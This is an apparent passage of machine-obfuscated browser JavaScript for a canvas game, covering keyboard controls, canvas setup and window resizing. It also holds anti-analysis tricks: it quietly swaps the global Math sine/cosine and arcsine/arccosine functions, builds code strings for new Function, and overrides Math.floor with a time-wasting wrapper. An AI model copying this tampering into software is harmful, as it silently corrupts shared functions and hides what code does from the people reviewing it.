			this.angle = ᐃⵠΔ;
			this.state = this.IDLE;
			this.ᐃⵠⵠᐃ = this.ⲆⵠΔⵠᐃᐃᐃ;
			this.down = function() {
				this.state = this.ⵠᐃⵠΔΔΔᐃ
			};
			this.up = function() {
				this.state = this.ⲆΔⵠᐃᐃ
			};
			this.ⵠⲆᐃ = function() {
				if (this.ⵠΔΔᐃ.x != this.ΔᐃⲆᐃᐃᐃⲆ || this.ᐃΔΔⵠᐃΔⵠ != this.ⵠΔΔᐃ.y) {
					this.ΔᐃⲆᐃᐃᐃⲆ = this.ⵠΔΔᐃ.x;
					this.ᐃΔΔⵠᐃΔⵠ = this.ⵠΔΔᐃ.y;
					return true
				}
				return false
			}
		}
		const ⲆⲆⲆΔ = ⲆⵠΔⵠ;

		function ΔⵠᐃᐃⵠᐃΔ() {
			this.ⵠⲆⲆⲆⲆᐃⵠ = function() {
				this.ⲆᐃΔΔᐃ = 81;
				this.ⲆᐃᐃΔᐃ = 68;
				this.ⵠⲆⲆⵠΔ = 90;
				this.ⵠᐃⵠΔΔΔᐃ = 83
			};
			this.ⲆⵠᐃⲆᐃΔⵠ = function() {
				this.ⲆᐃΔΔᐃ = 65;
				this.ⲆᐃᐃΔᐃ = 68;
				this.ⵠⲆⲆⵠΔ = 87;
				this.ᐃΔᐃᐃⲆ = 83
			};
			this.ⲆΔⵠᐃᐃ = ᐃⵠΔ, this.ⵠᐃⵠΔΔΔᐃ = ΔⲆⵠ, this.ᐃⲆΔⵠⵠⲆᐃ = 49;
			this.ᐃΔⲆⲆΔⲆᐃ = 50;
			this.ⲆⲆᐃⲆΔⵠⲆ = 51;
			this.ⵠⵠΔⵠᐃⵠΔ = 52;
			this.ΔⵠᐃⲆⲆⲆⵠⵠΔ = 53;
			this.ΔⵠΔⲆⲆᐃⲆ = 17;
			this.ᐃΔᐃᐃᐃⲆⵠ = 37;
			this.ⲆⲆᐃᐃⵠᐃᐃ = 39;
			this.ΔⵠⵠΔⵠΔΔ = 38;
			this.ⵠⲆⲆⵠⲆᐃᐃ = 40;
			this.ᐃⵠΔᐃΔⲆⲆ = 32;
			this.ⵠⵠΔⲆΔΔΔ = 82;
			this.ⵠΔᐃᐃⵠΔΔ = 71;
			this.ΔΔΔΔᐃΔᐃ = 86;
			this.ᐃⲆΔᐃⵠⵠΔ = 66;
			this.ⲆⵠᐃⲆᐃΔⵠ();
			this.keys = new Array(ΔΔᐃΔⲆ);
			for (var ⵠᐃ = ΔⲆⲆ; ⵠᐃ < 255; ⵠᐃ++) this.keys[ⵠᐃ] = this.ⲆΔⵠᐃᐃ;
			this.up = function(ΔΔΔⲆ) {
				var ⵠᐃⲆⲆ = Math.min(ΔΔΔⲆ.charCode || ΔΔΔⲆ.keyCode, 255);
				this.keys[ⵠᐃⲆⲆ] = this.ⲆΔⵠᐃᐃ
			};
			this.down = function(ΔΔΔⲆ) {
				var ⵠᐃⲆⲆ = Math.min(ΔΔΔⲆ.charCode || ΔΔΔⲆ.keyCode, 255);
				if (ⵠᐃⲆⲆ == this.ⲆᐃΔΔᐃ || this.ᐃΔᐃᐃᐃⲆⵠ == ⵠᐃⲆⲆ) this.ᐃⲆᐃΔΔᐃⲆ();
				else if (this.ⵠⲆⲆⵠΔ == ⵠᐃⲆⲆ || this.ΔⵠⵠΔⵠΔΔ == ⵠᐃⲆⲆ) this.ᐃᐃΔΔΔᐃⲆ();
				else if (ⵠᐃⲆⲆ == this.ⵠᐃⵠΔΔΔᐃ || this.ΔⲆⲆⵠᐃⵠΔⲆΔ == ⵠᐃⲆⲆ) this.ᐃⲆⲆⲆⵠⲆΔ();
				else(ⵠᐃⲆⲆ == this.ⲆᐃᐃΔᐃ || this.ⲆⲆᐃᐃⵠᐃᐃ == ⵠᐃⲆⲆ) && this.ΔⵠᐃⲆⲆⵠᐃ();
				this.keys[ⵠᐃⲆⲆ] = this.ⵠᐃⵠΔΔΔᐃ;
				return ⵠᐃⲆⲆ
			};
			this.ᐃⲆᐃΔΔᐃⲆ = function() {
				this.keys[this.ⲆᐃᐃΔᐃ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ⲆⲆᐃᐃⵠᐃᐃ] = this.ⲆΔⵠᐃᐃ
			};
			this.ΔⵠᐃⲆⲆⵠᐃ = function() {
				this.keys[this.ⲆᐃΔΔᐃ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ᐃΔᐃᐃᐃⲆⵠ] = this.ⲆΔⵠᐃᐃ
			};
			this.ᐃⲆⲆⲆⵠⲆΔ = function() {
				this.keys[this.ⵠⲆⲆⵠΔ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ΔⵠⵠΔⵠΔΔ] = this.ⲆΔⵠᐃᐃ
			};
			this.ᐃᐃΔΔΔᐃⲆ = function() {
				this.keys[this.ᐃΔᐃᐃⲆ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ⵠⲆⲆⵠⲆᐃᐃ] = this.ⲆΔⵠᐃᐃ
			};
			this.ⲆⲆΔⵠΔⲆⵠ = function() {
				this.keys[this.ⲆᐃᐃΔᐃ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ⲆⲆᐃᐃⵠᐃᐃ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ⲆᐃΔΔᐃ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ᐃΔᐃᐃᐃⲆⵠ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ⵠⲆⲆⵠΔ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ΔⵠⵠΔⵠΔΔ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ᐃΔᐃᐃⲆ] = this.ⲆΔⵠᐃᐃ;
				this.keys[this.ⵠⲆⲆⵠⲆᐃᐃ] = this.ⲆΔⵠᐃᐃ
			};
			this.ⵠⲆΔᐃⲆⲆΔ = function() {
				return this.keys[this.ⲆᐃΔΔᐃ] || this.keys[this.ᐃΔᐃᐃᐃⲆⵠ]
			};
			this.ᐃⲆⵠᐃⵠᐃⲆ = function() {
				return this.keys[this.ⲆᐃᐃΔᐃ] || this.keys[this.ⲆⲆᐃᐃⵠᐃᐃ]
			};
			this.ⲆΔⲆⵠᐃᐃⵠ = function() {
				return this.keys[this.ⵠⲆⲆⵠΔ] || this.keys[this.ΔⵠⵠΔⵠΔΔ]
			};
			this.ⵠⲆⵠⲆΔᐃᐃ = function() {
				return this.keys[this.ᐃΔᐃᐃⲆ] || this.keys[this.ⵠⲆⲆⵠⲆᐃᐃ]
			};
			this.ⵠΔΔⵠⵠⵠⲆⵠⲆ = function() {
				return this.keys[this.ΔⵠΔⲆⲆᐃⲆ]
			};
			this.ⲆΔᐃᐃⲆΔΔⲆⵠ = function() {
				return this.keys[this.ᐃⲆΔⵠⵠⲆᐃ]
			};
			this.ⲆᐃⲆᐃⲆⲆΔⵠⲆ = function() {
				return this.keys[this.ᐃΔⲆⲆΔⲆᐃ]
			};
			this.ᐃᐃΔⲆΔΔⲆΔⵠ = function() {
				return this.keys[this.ⲆⲆᐃⲆΔⵠⲆ]
			};
			this.ⵠᐃΔⲆΔᐃⲆⲆⲆ = function() {
				return this.keys[this.ⵠⵠΔⵠᐃⵠΔ]
			};
			this.ⵠⵠⵠⲆⵠᐃΔᐃᐃ = function() {
				return this.keys[this.ᐃⵠΔᐃΔⲆⲆ]
			};
			this.ΔⲆᐃⵠΔΔⵠⵠⲆ = function() {
				return this.keys[this.ⵠⵠΔⲆΔΔΔ]
			};
			this.ⲆⵠⵠΔⲆⵠⲆⵠⵠ = function() {
				return this.keys[this.ⵠΔᐃᐃⵠΔΔ]
			};
			this.ΔΔᐃΔⲆᐃⵠⵠΔ = function() {
				return this.keys[this.ΔΔΔΔᐃΔᐃ]
			};
			this.ΔⵠᐃⲆΔᐃⲆⵠⲆ = function() {
				return this.keys[this.ᐃⲆΔᐃⵠⵠΔ]
			}
		}
		const ΔΔΔ = ΔⲆⵠ;
		const ⲆⲆΔⲆⲆ = ᐃᐃⲆᐃᐃ;

		function ⵠⲆᐃΔᐃⲆΔ(Δⵠⵠⵠᐃⵠⵠ, ᐃΔᐃΔΔ, ⵠⲆⵠⲆⲆⲆΔ) {
			ⲆΔᐃΔⲆᐃᐃ(ⲆᐃΔⵠⲆ, Δⵠⵠⵠᐃⵠⵠ, ᐃΔᐃΔΔ, ⵠⲆⵠⲆⲆⲆΔ);
			const ⲆⲆⵠᐃΔΔⵠ = ΔΔⲆⵠᐃⲆΔ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[1]);
			const ⲆⲆⵠᐃⲆⲆΔᐃΔ = ᐃⵠⵠⲆᐃⵠⲆ(ΔᐃΔᐃ[ⲆᐃᐃⲆ], ΔᐃΔᐃ[0], ΔᐃΔᐃ[ⵠΔᐃ], ΔᐃΔᐃ[2]);
			const ᐃΔΔᐃⲆⵠᐃ = (ⲆⲆⵠᐃΔΔⵠ | 8062) & ~(ⲆⲆⵠᐃΔΔⵠ & 8062);
			return ᐃΔΔᐃⲆⵠᐃ
		}
		const ΔᐃⵠⲆⲆ = ᐃⵠΔᐃᐃ;
		var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[68]]("game_canvas");
		var Δ = Ⲇⵠ.getContext(ⵠ[289]);
		var ΔΔΔᐃ = Ⲇⵠ.width;
		const ⲆΔΔΔΔᐃⵠ = ⲆᐃΔᐃΔᐃᐃ;
		var ⵠⲆᐃⲆ = Ⲇⵠ.height;
		var Δᐃⵠᐃ = Ⲇⵠ.width / ΔⵠᐃⲆ;
		var ᐃΔⵠᐃ = Ⲇⵠ.height / 2;
		var ᐃⲆᐃⵠⲆⲆΔ = {
			x: Δᐃⵠᐃ,
			y: ᐃΔⵠᐃ
		};
		var ᐃ = ⵠΔᐃ;
		const ⲆⲆⵠΔⵠ = ΔⲆⲆⲆⵠ;
		var ⵠᐃⵠⵠΔᐃⵠ = 1;
		var ᐃⲆⲆᐃΔᐃᐃ = -1;
		const ⵠΔⵠⲆᐃᐃⵠ = ⲆⵠᐃⲆΔⲆⵠ;
		const ⵠⵠΔⵠΔ = ⲆⲆⲆⵠⵠ;
		const ᐃⵠⲆᐃᐃ = ΔᐃΔⲆⲆ;
		var ⵠᐃΔⵠᐃΔⲆ;
		const ⵠΔⵠᐃⵠᐃᐃⵠΔ = ⲆΔΔΔΔᐃⵠ;
		const ⵠⵠⵠᐃ = ᐃⲆΔⵠ;
		var ⲆⲆⲆᐃⵠⵠΔ = "J" + ⵠⲆⲆΔᐃᐃᐃ;
		const ᐃⲆᐃᐃⲆ = ᐃⵠΔᐃΔ;
		const ⵠⵠΔΔ = ⵠᐃΔⵠ;
		const ᐃⲆᐃ = ᐃᐃⵠ;
		const ⲆⵠΔⲆⲆⵠⲆ = ΔⵠᐃΔⵠ;
		const Δⵠᐃ = ᐃⵠⲆ;
		const ⵠⲆΔⵠⵠ = ⲆΔⲆΔⵠ;
		const ⲆⵠᐃᐃⲆ = ᐃΔⲆⵠᐃ;
		const ᐃⲆⲆᐃΔ = ⲆΔΔⲆΔ;
		var ⵠΔⲆᐃᐃΔΔ = "S" + ΔΔⵠⵠⵠ;
		const ⵠⵠΔⲆᐃ = ᐃΔᐃΔⲆ;
		const ⲆⲆⲆᐃⵠ = ᐃᐃⵠΔⵠ;
		var ᐃᐃΔΔⵠΔⵠ = ᐃⲆᐃΔᐃⵠᐃ;
		var ΔΔⵠⵠⵠ;
		const ⲆⵠⲆΔᐃᐃᐃⲆᐃ = ⵠᐃΔᐃᐃΔⲆ;
		var ΔⲆⵠΔᐃ;
		var ⵠⵠⲆⲆᐃⵠⲆ = "O";
		const ΔΔᐃᐃⵠᐃΔ = ⵠᐃⲆΔⵠᐃⵠ;
		const ⲆⵠᐃⲆⲆ = ⵠⵠΔⵠΔ;
		var ᐃᐃⲆⲆᐃΔᐃ = ⵠⵠⲆⲆᐃⵠⲆ + "N";
		const ⵠᐃΔᐃᐃᐃᐃ = ΔⵠⲆⵠᐃ;
		const ΔΔⵠ = ᐃⵠΔ;
		const ᐃΔᐃΔᐃ = ᐃΔΔⵠᐃ;
		var ⲆΔᐃⵠᐃᐃⵠ = "O";
		const ΔⲆⵠΔⵠ = ⵠΔΔⵠⲆ;
		const ᐃᐃⲆⵠΔΔᐃ = ⵠᐃᐃΔᐃ;
		const ⲆᐃΔⵠⵠ = ⵠⵠΔᐃᐃ;
		const ⵠⲆΔ = ΔⲆⵠ;
		const ⵠᐃⲆⲆⲆⲆⲆ = ⵠⵠᐃΔΔ;
		const ᐃΔᐃⲆⲆ = ⲆΔⲆⵠᐃ;
		var ΔᐃΔΔΔⵠΔ = ΔⲆⲆ;
		var ⵠⲆⲆΔᐃᐃᐃ;
		const ᐃⲆΔⲆⵠ = ᐃⵠΔᐃᐃ;
		const ⵠΔᐃΔᐃ = ΔᐃΔⵠⵠ;
		var ΔᐃⲆⲆⲆⲆᐃ = ᐃᐃΔΔⵠΔⵠ;
		var ΔΔⵠⵠⵠ;
		var ΔⲆΔᐃᐃⲆⵠ;
		var ⵠΔⲆᐃᐃΔΔ = "N";
		var ΔΔΔᐃⵠ = "J";
		var ⵠⵠⲆⲆᐃⵠⲆ = "O" + ⵠⲆⲆΔᐃᐃᐃ;
		const ΔⵠΔᐃⵠ = ⵠⵠⵠⵠΔ;
		var ⲆⲆⲆᐃⵠⵠΔ;
		const ⲆᐃΔᐃⵠⵠⵠ = ⵠΔⵠⲆᐃᐃⵠ;
		const ΔⵠᐃᐃⲆ = ⵠⲆⲆΔᐃ;
		const ⲆⵠᐃᐃΔΔⵠ = ΔᐃΔᐃᐃⲆⵠ;
		var ⵠⲆⵠⲆⲆ = ΔᐃⲆⲆⲆⲆᐃ;
		var ᐃᐃᐃΔⲆⲆᐃ;
		const ᐃⵠⵠΔ = Ⲇⵠⵠⵠ;
		var ⵠᐃΔⵠᐃΔⲆ;
		const ΔᐃΔᐃΔ = ΔᐃⵠⲆⲆ;
		var ⵠᐃⲆΔⲆΔⲆ;
		var ᐃΔᐃΔΔΔⲆ;
		var ΔΔⵠⵠⵠ;
		var ⵠⲆⲆΔᐃᐃᐃ;
		var ⲆⲆΔᐃᐃᐃᐃ = ⵠⲆⵠⲆⲆ;
		var ᐃᐃⲆⲆᐃΔᐃ = "N" + ᐃΔᐃΔΔΔⲆ;
		var ᐃᐃⲆⲆᐃΔᐃ;
		var ᐃᐃⵠΔᐃ = ⲆⲆΔᐃᐃᐃᐃ;
		const ᐃΔΔⲆ = ΔⵠⲆⲆ;
		var ᐃᐃᐃⵠⲆ;
		var ⵠⵠⲆⲆᐃⵠⲆ;
		var ⵠᐃΔⵠᐃΔⲆ;
		var ᐃᐃᐃΔⲆⲆᐃ = "";
		var ⵠᐃΔⵠⵠΔΔ;
		const ᐃⲆᐃⵠⵠ = ⵠⲆᐃΔᐃ;
		const ⵠᐃΔΔΔⲆⲆ = ΔⲆⲆΔΔ;
		const ᐃⵠᐃⲆⲆⲆΔ = ⵠⵠⵠⲆᐃΔⲆ;
		const ⵠⵠᐃᐃᐃ = ⵠⵠΔⵠΔ;
		var ᐃΔΔΔⵠᐃᐃ = ᐃᐃⵠΔᐃ;
		var ⲆⵠΔⵠΔΔᐃ = ᐃⲆᐃΔᐃⵠᐃ["Math"].acos;
		ᐃⲆᐃΔᐃⵠᐃ["Math"].acos = ᐃⲆᐃΔᐃⵠᐃ["Math"].asin;
		ᐃⲆᐃΔᐃⵠᐃ["Math"].asin = ⲆⵠΔⵠΔΔᐃ;
		var ΔᐃᐃᐃⲆⵠᐃ = ᐃⲆᐃΔᐃⵠᐃ["Math"].cos;
		ᐃⲆᐃΔᐃⵠᐃ["Math"].cos = ᐃⲆᐃΔᐃⵠᐃ["Math"].sin;
		ᐃⲆᐃΔᐃⵠᐃ["Math"].sin = ΔᐃᐃᐃⲆⵠᐃ;
		var ⵠᐃⲆΔᐃᐃⵠ;
		var ΔΔⵠⵠⵠ;
		const ᐃⲆⲆΔⵠ = ⵠΔᐃΔᐃ;
		var ⵠⲆⲆΔᐃᐃᐃ;
		var ΔΔⲆⵠⲆⵠᐃ = ᐃΔΔΔⵠᐃᐃ;
		const ᐃⲆᐃᐃΔ = ΔⵠΔᐃᐃ;
		var ⵠⵠⲆⲆᐃⵠⲆ;
		var ᐃⲆΔᐃⵠᐃⲆ;
		const ⵠⲆⲆᐃⲆⵠⵠ = ⲆΔᐃⵠᐃ;
		var ⲆⲆⲆᐃⵠⵠΔ;
		var ᐃⵠᐃⵠⵠⵠⵠ = ΔΔⲆⵠⲆⵠᐃ;
		var ΔΔΔᐃⵠ = "O";
		var ⵠᐃΔⵠᐃΔⲆ = "J";
		const ⵠⲆⵠᐃ = ⵠᐃᐃⲆ;
		const ᐃᐃⲆⲆ = ᐃⲆΔⵠ;
		const ᐃⵠΔⵠⲆ = ᐃⵠⵠⲆᐃ;
		const ΔᐃⲆᐃ = ⵠᐃᐃΔ;
		const ΔᐃΔⵠΔⲆᐃ = ⲆⵠᐃⲆΔⲆⵠ;
		const ⲆᐃΔⲆⵠ = ᐃⵠⲆᐃᐃ;
		var ⵠΔⲆᐃᐃΔΔ;
		var ΔᐃΔᐃᐃΔⵠ;
		const ⵠΔᐃⵠⵠ = ΔⲆΔᐃᐃ;
		const ⵠᐃᐃⵠⲆⵠⲆ = ⵠᐃΔᐃᐃᐃᐃ;
		const ⲆⲆΔᐃ = ΔⵠᐃⲆ;
		var ⵠᐃΔⵠᐃΔⲆ;
		const ⵠⵠⵠⲆᐃ = ᐃΔᐃⲆⵠ;
		var ᐃⵠᐃⵠⵠⵠⵠ = ΔΔⲆⵠⲆⵠᐃ;
		const ⵠⲆⵠⲆⵠ = ⲆΔⲆⲆᐃ;
		var ΔᐃΔᐃᐃΔⵠ = "S";
		const ⲆᐃⲆᐃ = ᐃⲆⲆⲆ;
		const ᐃⲆⵠⵠ = ⵠᐃΔⵠ;
		const ⵠⲆⵠⵠΔ = ᐃᐃⲆᐃᐃ;
		const ΔⵠⲆᐃⵠⲆᐃ = ᐃᐃⲆⵠΔΔᐃ;

		function ΔⵠᐃⲆⵠΔⲆⲆΔ() {
			return 1371285
		}
		const ⲆⵠⵠⲆⵠⲆᐃᐃΔ = 3818789;
		const ⲆΔⲆᐃⵠΔΔ = ΔⵠᐃⲆⵠΔⲆⲆΔ + " let ⵠⲆᐃⲆᐃⲆΔⵠᐃ = ΔⵠᐃⲆⵠΔⲆⲆΔ () * 13416204; return ⵠⲆᐃⲆᐃⲆΔⵠᐃ;";
		const ⲆⵠᐃΔⵠⵠΔⲆᐃ = new Function(ⲆΔⲆᐃⵠΔΔ);
		try {
			ⲆⵠᐃΔⵠⵠΔⲆᐃ(ⲆⵠⵠⲆⵠⲆᐃᐃΔ)
		} catch (e) {
			const ⲆⵠⵠⲆⵠⲆᐃᐃΔ = Math.floor;
			let ⲆⵠᐃΔⵠⵠΔⲆᐃ = 0;
			const ⲆΔⲆᐃⵠΔΔ = function(ⲆΔⲆᐃⵠΔΔ) {
				for (let ⵠⲆᐃⲆᐃⲆΔⵠᐃ = 0; ⵠⲆᐃⲆᐃⲆΔⵠᐃ < 3397; ⵠⲆᐃⲆᐃⲆΔⵠᐃ++) ⲆⵠᐃΔⵠⵠΔⲆᐃ += ⵠⲆᐃⲆᐃⲆΔⵠᐃ;
				return ⲆⵠⵠⲆⵠⲆᐃᐃΔ(ⲆΔⲆᐃⵠΔΔ)
			};
			Math.floor = ⲆΔⲆᐃⵠΔΔ
		}
		var ᐃⵠⲆᐃᐃⵠΔ = ᐃⵠᐃⵠⵠⵠⵠ;
		var ᐃΔᐃΔΔΔⲆ;
		const ⵠⲆⲆ = ΔΔⵠ;
		var Δᐃⵠᐃᐃᐃⵠ;
		var ⲆⵠΔⲆᐃΔⵠ = ᐃⵠⲆᐃᐃⵠΔ;
		var ΔΔⵠⵠⵠ = ⵠᐃΔⵠᐃΔⲆ + ΔᐃΔᐃᐃΔⵠ;
		const ᐃᐃⵠⵠΔ = ⲆⵠᐃⲆⲆ;
		Ⲇⵠ.oncontextmenu = function() {
			return false
		};
		const Ⲇᐃᐃᐃᐃ = ΔⲆⲆᐃᐃ;
		const Δᐃᐃᐃᐃⵠⵠ = ⲆΔΔⵠⲆ;
		ⲆⲆⲆᐃⵠⵠΔ = ⵠᐃΔⵠᐃΔⲆ;
		ᐃᐃᐃΔⲆⲆᐃ = ⲆⲆⲆᐃⵠⵠΔ;

		function ⵠᐃⵠ(ⲆΔᐃⲆ) {
			var ᐃⵠ = new Image;
			ᐃⵠ.src = ⲆΔᐃⲆ.toDataURL("image/png");
			ᐃⵠ.width = ⲆΔᐃⲆ.width;
			ᐃⵠ.height = ⲆΔᐃⲆ.height;
			ᐃⵠ.ΔᐃᐃΔⲆⲆΔ = 1;
			return ᐃⵠ
		}
		ⲆⲆⲆᐃⵠⵠΔ = ⵠΔⲆᐃᐃΔΔ;
		const ᐃⵠᐃΔⵠᐃⵠΔⲆ = ΔⵠΔᐃⵠᐃⵠ;
		ΔΔΔᐃⵠ = ΔΔΔᐃⵠ + ⲆⲆⲆᐃⵠⵠΔ;
		const ᐃⲆᐃⲆᐃⵠⲆ = ΔΔᐃⲆⲆⵠⵠ;
		const ⲆᐃΔⲆᐃ = ⲆΔᐃᐃᐃ;

		function ᐃᐃᐃᐃⵠᐃⲆ() {
			return 5792151
		}
		const ᐃⲆⲆΔΔΔᐃ = 12178781;
		const ⵠⲆΔⲆⵠⵠΔ = ᐃᐃᐃᐃⵠᐃⲆ + " let ΔΔᐃⲆⵠⵠⲆᐃⵠ = ᐃᐃᐃᐃⵠᐃⲆ () * 13753405; return ΔΔᐃⲆⵠⵠⲆᐃⵠ;";
		const ᐃⲆΔΔᐃⵠΔ = new Function(ⵠⲆΔⲆⵠⵠΔ);
		try {
			ᐃⲆΔΔᐃⵠΔ(ᐃⲆⲆΔΔΔᐃ)
		} catch (e) {
			const ᐃⲆⲆΔΔΔᐃ = Math.floor;
			let ᐃⲆΔΔᐃⵠΔ = 0;
			const ⵠⲆΔⲆⵠⵠΔ = function(ⵠⲆΔⲆⵠⵠΔ) {
				for (let ΔΔᐃⲆⵠⵠⲆᐃⵠ = 0; ΔΔᐃⲆⵠⵠⲆᐃⵠ < 7224; ΔΔᐃⲆⵠⵠⲆᐃⵠ++) ᐃⲆΔΔᐃⵠΔ += ΔΔᐃⲆⵠⵠⲆᐃⵠ;
				return ᐃⲆⲆΔΔΔᐃ(ⵠⲆΔⲆⵠⵠΔ)
			};
			Math.floor = ⵠⲆΔⲆⵠⵠΔ
		}
		ⲆΔᐃⵠᐃᐃⵠ = ΔΔⵠⵠⵠ + ΔΔΔᐃⵠ;
		ΔⲆⵠΔᐃ = ⲆΔᐃⵠᐃᐃⵠ;
		const ⵠⵠⵠⲆⲆ = ⵠᐃᐃΔ;
		const ⵠᐃⵠΔᐃ = ⲆΔⲆⵠᐃ;
		const ᐃⲆⵠᐃⲆ = ⵠΔΔⵠⲆ;
		ⵠⵠⲆⲆᐃⵠⲆ = ᐃᐃⲆⲆᐃΔᐃ;
		ΔⲆΔᐃᐃⲆⵠ = ΔⲆⵠΔᐃ;
		const ΔᐃΔⲆⲆⲆⲆ = ⵠᐃⵠΔᐃ;
		const ᐃᐃᐃᐃⲆ = ⲆⵠⵠⲆⲆ;
		ᐃᐃⲆⲆᐃΔᐃ = ⵠⲆⲆΔᐃᐃᐃ;
		const ⵠⵠⲆΔΔ = ⲆⵠⲆⵠⲆ;
		const Ⲇᐃⵠ = ⵠΔΔ;
		const ᐃΔΔⲆΔ = ΔΔΔΔⲆ;
		const ⵠⵠⲆⵠΔᐃᐃΔⵠ = ⲆᐃⵠᐃⲆⵠⲆ;
		const ⵠᐃⵠᐃᐃ = ᐃⵠΔⵠⲆ;
		const ⲆΔⲆᐃΔΔⲆ = ⲆⲆⲆⵠⲆ;
		const ᐃⵠⵠⵠΔ = ᐃⵠⵠᐃᐃ;
		const ⲆⲆΔⵠᐃ = ᐃⲆⵠᐃⲆ;
		const ᐃⵠᐃᐃⲆ = ⵠⲆⲆΔᐃ;
		ⵠⲆⲆΔᐃᐃᐃ = ΔΔⵠⵠⵠ;
		ᐃᐃᐃⵠⲆ = ΔΔⵠⵠⵠ + ΔΔΔᐃⵠ;
		ⵠⲆⲆΔᐃᐃᐃ = ΔΔⵠⵠⵠ;
		const ΔⵠⲆΔᐃΔⵠ = ᐃᐃᐃⵠⵠ;
		ⵠⵠⲆⲆᐃⵠⲆ = ΔΔⵠⵠⵠ;
		ⵠᐃⲆΔⲆΔⲆ = ᐃᐃᐃⵠⲆ;
		ⵠΔⲆᐃᐃΔΔ = ΔΔΔᐃⵠ + ⲆⲆⲆᐃⵠⵠΔ;
		const ⲆΔⵠᐃⲆ = ΔᐃⵠⲆⵠ;
		ⵠᐃΔⵠⵠΔΔ = ΔⲆⵠΔᐃ;
		ⵠⵠⲆⲆᐃⵠⲆ = ΔΔⵠⵠⵠ + ΔΔΔᐃⵠ;
		ⵠᐃⲆΔᐃᐃⵠ = ⲆΔᐃⵠᐃᐃⵠ;
		ᐃᐃⲆⲆᐃΔᐃ = ΔΔⵠⵠⵠ + ΔΔΔᐃⵠ;
		const ΔΔᐃⵠᐃ = ᐃΔᐃⲆΔ;
		ᐃⲆΔᐃⵠᐃⲆ = ΔⲆΔᐃᐃⲆⵠ;
		const ⲆⵠⲆⲆⲆ = Ⲇᐃⵠⵠⵠ;
		const ⲆⵠΔᐃⵠ = ᐃⲆⵠᐃⲆ;
		const ⵠⵠⲆⲆΔ = ⵠᐃⲆᐃΔ;
		const ΔᐃⲆⵠᐃ = ᐃΔᐃⲆⵠ;
		ΔΔΔᐃⵠ = ⵠⲆⲆΔᐃᐃᐃ;
		ΔᐃΔᐃᐃΔⵠ = ⲆΔᐃⵠᐃᐃⵠ;
		Δᐃⵠᐃᐃᐃⵠ = ΔⲆⵠΔᐃ;
		ⲆⲆⲆᐃⵠⵠΔ = ⵠⵠⲆⲆᐃⵠⲆ;
		const ⵠᐃΔⵠⲆ = ⵠΔⵠᐃⵠ;
		const Ⲇᐃⵠᐃ = Ⲇⵠⵠⵠ;
		const ΔⲆᐃᐃⲆ = ⵠⵠⵠⵠΔ;
		var devicePixelRatio = ᐃⲆᐃΔᐃⵠᐃ.devicePixelRatio || ΔΔΔ;
		const ΔⲆⵠⲆⵠᐃᐃⲆⲆ = ⲆᐃΔᐃΔᐃᐃ;
		const ⵠΔⲆᐃᐃ = ⲆⲆⲆΔΔ;
		const ᐃⲆᐃᐃⵠⵠⲆ = ΔΔⵠΔΔᐃⲆ;
		const ᐃΔⲆΔⵠ = ⵠⲆᐃΔᐃ;
		const ⵠᐃΔⵠΔ = ⲆⵠⲆⲆⲆ;
		const ⵠᐃⵠⲆⲆ = ΔⲆⲆΔΔ;
		var ⲆΔᐃΔΔᐃⲆ = Δ.ⲆⵠΔᐃⲆⲆᐃⲆⲆ || Δ.ⵠⲆᐃΔⲆᐃⲆᐃⲆ || Δ.ⵠΔⵠᐃΔΔⵠΔΔ || Δ.ⲆΔⵠⵠⵠᐃⵠⲆⵠ || Δ.ⲆᐃⵠⵠΔᐃⲆⲆⵠ || ᐃᐃⵠ;

		function ⲆⲆΔⲆⲆⵠᐃ() {
			if (ᐃⲆᐃΔᐃⵠᐃ.innerWidth != Ⲇⵠ.width) {
				Ⲇⵠ.width = ᐃⲆᐃΔᐃⵠᐃ.innerWidth;
				ΔΔΔᐃ = Ⲇⵠ.width;
				Δᐃⵠᐃ = Ⲇⵠ.width / 2
			}
			ᐃⲆᐃΔᐃⵠᐃ.innerHeight != Ⲇⵠ.height && (Ⲇⵠ.height = ᐃⲆᐃΔᐃⵠᐃ.innerHeight, ⵠⲆᐃⲆ = Ⲇⵠ.height, ᐃΔⵠᐃ = Ⲇⵠ.height / ⵠⵠΔⲆ);
			ᐃⲆᐃⵠⲆⲆΔ = {
				x: Δᐃⵠᐃ,
				y: ᐃΔⵠᐃ
			};
			var ⲆⲆⵠᐃⵠᐃⵠ = Ⲇⵠ.width;
			var ΔⲆᐃⵠΔᐃⵠ = Ⲇⵠ.height;
			if (-ᐃⲆᐃ === ᐃⲆⲆᐃΔᐃᐃ) ⵠᐃⵠⵠΔᐃⵠ = devicePixelRatio / ⲆΔᐃΔΔᐃⲆ;
			else ⵠᐃⵠⵠΔᐃⵠ = ᐃⲆⲆᐃΔᐃᐃ;
			Ⲇⵠ.width = ⵠᐃⵠⵠΔᐃⵠ * ⲆⲆⵠᐃⵠᐃⵠ;
			Ⲇⵠ.height = ΔⲆᐃⵠΔᐃⵠ * ⵠᐃⵠⵠΔᐃⵠ;
			Ⲇⵠ.style.width = ⲆⲆⵠᐃⵠᐃⵠ + ⵠ[39];
			Ⲇⵠ.style.height = ΔⲆᐃⵠΔᐃⵠ + ⵠ[39];
			Δ.scale(ⵠᐃⵠⵠΔᐃⵠ, ⵠᐃⵠⵠΔᐃⵠ);
			if (ᐃᐃΔ) {
				ᐃᐃΔ.ⲆΔΔ.ⲆᐃᐃᐃⲆⵠⲆ = ⲆⲆⵠᐃⵠᐃⵠ;
				ᐃᐃΔ.ⲆΔΔ.ᐃΔⵠΔΔΔᐃ = ΔⲆᐃⵠΔᐃⵠ
			}
			if (ΔΔΔΔⵠⲆΔ.ⲆΔⲆᐃⵠ) ΔΔΔΔⵠⲆΔ.ⵠⲆᐃ();
			else if (ⵠⲆᐃΔ.ⲆΔⲆᐃⵠ) ⵠⲆᐃΔ.ⵠⲆᐃ();
			else if (ΔⵠⵠⲆ.ⲆΔⲆᐃⵠ) ΔⵠⵠⲆ.ⵠⲆᐃ();
